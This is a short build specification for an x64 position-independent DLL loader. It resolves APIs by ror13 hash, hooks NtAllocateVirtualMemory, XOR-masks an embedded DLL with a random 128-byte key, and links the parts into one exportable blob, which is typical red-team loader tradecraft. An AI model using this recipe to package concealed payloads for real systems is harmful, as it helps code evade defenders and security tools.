x64:
    load "bin/loader.x64.o"
        make pic +gofirst

    dfr "resolve" "ror13"

    attach   "NTDLL$NtAllocateVirtualMemory" "_HookedNtAllocateVirtualMemory"
    preserve "NTDLL$NtAllocateVirtualMemory" "_HookedNtAllocateVirtualMemory"

    generate $MASK 128
    push $DLL
        xor $MASK
        preplen
        link "dll"
    push $MASK
        preplen
        link "mask"
    run "pico.spec"
        link "pico"
    export
